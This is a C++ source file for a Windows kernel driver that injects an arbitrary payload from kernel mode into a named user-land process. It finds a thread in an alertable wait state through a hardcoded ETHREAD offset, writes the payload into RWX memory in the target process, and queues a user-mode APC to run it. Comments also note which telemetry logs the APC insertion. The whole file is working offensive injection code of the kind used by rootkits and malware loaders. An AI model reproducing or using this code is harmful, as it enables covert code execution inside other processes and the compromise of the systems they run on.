// ========================================================================
// File: KernelToUserInjection.cpp
//
// Author: winterknife
//
// Description: Source file that contains the necessary routines to inject
// code from kernel-mode into a user-land process
//
// Modifications:
//  2026-04-13	Created
//  2026-04-20  Updated
// ========================================================================

// ========================================================================
// Includes
// ========================================================================

#include "../Inc/KernelToUserInjection.h"

// ========================================================================
// Routines
// ========================================================================

#pragma region ROUTINES

_Use_decl_annotations_
NTSTATUS __stdcall query_process_by_name(
	PUNICODE_STRING puncImageName,
	PDWORD          pdwPid,
	PDWORD          pdwTid
) {
	// Init local variables
	NTSTATUS status = STATUS_SUCCESS;
	DWORD dwBufferSize = 0;
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation = nullptr;
	PSYSTEM_PROCESS_INFORMATION pSystemProcessInformationCurrentEntry = nullptr;
	DWORD dwPid = 0;
	DWORD dwIndex = 0;
	HANDLE hTid = nullptr;
	PETHREAD pEthread = nullptr;

	// Sanity check the inputs
	if (puncImageName == nullptr || pdwPid == nullptr || pdwTid == nullptr) {
		status = STATUS_INVALID_PARAMETER;
		goto cleanup;
	}

	// Initialize args
	*pdwPid = 0;
	*pdwTid = 0;

	// Get the size of the buffer
	status = ZwQuerySystemInformation(SystemProcessInformation, nullptr, 0, &dwBufferSize);
	if (status == STATUS_INFO_LENGTH_MISMATCH) {
		dwBufferSize += PAGE_SIZE;
	}
	else {
		DEBUG_PRINT("[-] ZwQuerySystemInformation #1 error: 0x%08X\n", status);
		goto cleanup;
	}
	
	// Allocate the buffer
	pSystemProcessInformation = static_cast<PSYSTEM_PROCESS_INFORMATION>(ExAllocatePoolZero(NonPagedPoolNx, dwBufferSize, __POOLTAG__));
	if (pSystemProcessInformation == nullptr) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		DEBUG_PRINT("[-] ExAllocatePoolZero error: 0x%08X\n", status);
		goto cleanup;
	}

	// Query the list of active processes
	status = ZwQuerySystemInformation(SystemProcessInformation, pSystemProcessInformation, dwBufferSize, nullptr);
	if (!NT_SUCCESS(status)) {
		DEBUG_PRINT("[-] ZwQuerySystemInformation #2 error: 0x%08X\n", status);
		goto cleanup;
	}

	// Iterate through each SYSTEM_PROCESS_INFORMATION structure
	pSystemProcessInformationCurrentEntry = pSystemProcessInformation;
	do {
		// Compare image name of the current process with the image name of the target process
		if (RtlCompareUnicodeString(&pSystemProcessInformationCurrentEntry->ImageName, puncImageName, true) == 0) {
			// Get the PID
			dwPid = HandleToULong(pSystemProcessInformationCurrentEntry->UniqueProcessId);
			DEBUG_PRINT("[+] PID of target process: %d\n", dwPid);

			// Store the PID
			*pdwPid = dwPid;

			// Iterate through each SYSTEM_THREAD_INFORMATION structure
			for (dwIndex = 0; dwIndex < pSystemProcessInformationCurrentEntry->NumberOfThreads; dwIndex++) {
				// Get the TID of the current thread
				hTid = pSystemProcessInformationCurrentEntry->Threads[dwIndex].ClientId.UniqueThread;

				// Get a referenced pointer to the ETHREAD structure of the current thread
				status = PsLookupThreadByThreadId(hTid, &pEthread);
				if (!NT_SUCCESS(status)) {
					DEBUG_PRINT("[-] PsLookupThreadByThreadId error: 0x%08X\n", status);
					continue;
				}

				// Check if thread is in an alertable wait state
				// Should we also check for the absence of TEB and ActivationContext?
#pragma message("!!! HARDCODED OPAQUE OFFSET FOR WINDOWS 10 / 11 (ALL VERSIONS) !!!")
				if (_bittest(reinterpret_cast<LONG const*>(reinterpret_cast<DWORD_PTR>(pEthread) + 0x74ULL), 4)) {
					// Store the TID
					*pdwTid = HandleToULong(hTid);
					DEBUG_PRINT("[+] TID of thread in alertable wait state: %d\n", HandleToULong(hTid));

					// Decrement reference count
					ObDereferenceObject(pEthread);

					break;
				}

				// Decrement reference count
				ObDereferenceObject(pEthread);
			}

			break;
		}

		// Check for loop exit condition
		if (pSystemProcessInformationCurrentEntry->NextEntryOffset == 0)
			break;

		// Get the next entry
		pSystemProcessInformationCurrentEntry = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<PUCHAR>(pSystemProcessInformationCurrentEntry) + pSystemProcessInformationCurrentEntry->NextEntryOffset);
	} while (true);

	// Cleanup
cleanup:
	if (pSystemProcessInformation)
		ExFreePoolWithTag(pSystemProcessInformation, __POOLTAG__);

	return status;
}

_Use_decl_annotations_
NTSTATUS __stdcall inject_payload(
	PCWSTR    wstrImageName,
	PVOID     pPayload,
	DWORD_PTR dwptrPayloadSize
) {
	// Init local variables
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING uncImageName; ZERO_MEMORY(&uncImageName, sizeof(UNICODE_STRING));
	DWORD dwPid = 0;
	DWORD dwTid = 0;
	PEPROCESS pEprocess = nullptr;
	PETHREAD pEthread = nullptr;
	KAPC_STATE kapcState; ZERO_MEMORY(&kapcState, sizeof(KAPC_STATE));
	DWORD_PTR dwptrSize = 0;
	PVOID pBuffer = nullptr;
	PKAPC pKapc = nullptr;

	// Sanity check the inputs
	if (wstrImageName == nullptr || pPayload == nullptr || dwptrPayloadSize == 0) {
		status = STATUS_INVALID_PARAMETER;
		goto cleanup;
	}

	// Get the PID of the target process and the TID of a thread in an alertable wait state in the target process
	RtlInitUnicodeString(&uncImageName, wstrImageName);
	status = query_process_by_name(&uncImageName, &dwPid, &dwTid);
	if (!NT_SUCCESS(status) || dwPid == 0 || dwTid == 0) {
		goto cleanup;
	}

	// Get a referenced pointer to the EPROCESS structure of the target process
	status = PsLookupProcessByProcessId(ULongToHandle(dwPid), &pEprocess);
	if (!NT_SUCCESS(status)) {
		DEBUG_PRINT("[-] PsLookupProcessByProcessId error: 0x%08X\n", status);
		goto cleanup;
	}

	// Get a referenced pointer to the ETHREAD structure of the target thread
	status = PsLookupThreadByThreadId(ULongToHandle(dwTid), &pEthread);
	if (!NT_SUCCESS(status)) {
		DEBUG_PRINT("[-] PsLookupThreadByThreadId error: 0x%08X\n", status);
		goto cleanup;
	}

	// Attach the current thread to the address space of the target process
	KeStackAttachProcess(pEprocess, &kapcState);

	// Allocate RWX memory in the target process
	// You should change this to first allocate RW memory and then change the page protection to RX
	dwptrSize = dwptrPayloadSize;
	status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &pBuffer, 0, &dwptrSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status)) {
		DEBUG_PRINT("[-] ZwAllocateVirtualMemory error: 0x%08X\n", status);
		KeUnstackDetachProcess(&kapcState);
		goto cleanup;
	}
	DEBUG_PRINT("[+] Payload buffer UVA: 0x%p\n", pBuffer);

	// Copy ring 3 payload from KVAS to target process UVAS
	// This is quite risky!
	COPY_MEMORY(pBuffer, pPayload, dwptrPayloadSize);

	// Detach the current thread from the address space of the target process
	KeUnstackDetachProcess(&kapcState);

	// Allocate memory for the KAPC structure
	pKapc = static_cast<PKAPC>(ExAllocatePoolZero(NonPagedPoolNx, sizeof(KAPC), __POOLTAG__));
	if (pKapc == nullptr) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		DEBUG_PRINT("[-] ExAllocatePoolZero error: 0x%08X\n", status);
		goto cleanup;
	}

	// Initialize the normal user-mode APC
	KeInitializeApc(pKapc, pEthread, OriginalApcEnvironment, reinterpret_cast<PKKERNEL_ROUTINE>(ExFreePool), reinterpret_cast<PKRUNDOWN_ROUTINE>(ExFreePool), reinterpret_cast<PKNORMAL_ROUTINE>(pBuffer), UserMode, nullptr);

	// Insert the APC into the queue of the target thread
	// Be warned that this will be logged by nt!EtwTiLogQueueApcThread
	if (!KeInsertQueueApc(pKapc, nullptr, nullptr, IO_NO_INCREMENT)) {
		status = STATUS_UNSUCCESSFUL;
		DEBUG_PRINT("[-] KeInsertQueueApc error: 0x%08X\n", status);
		ExFreePoolWithTag(pKapc, __POOLTAG__);
		goto cleanup;
	}
	DEBUG_PRINT("[+] Queued a user-mode APC to the target thread!\n");

	// Cleanup
cleanup:
	if (pEthread)
		ObDereferenceObject(pEthread);

	if (pEprocess)
		ObDereferenceObject(pEprocess);

	return status;
}

#pragma endregion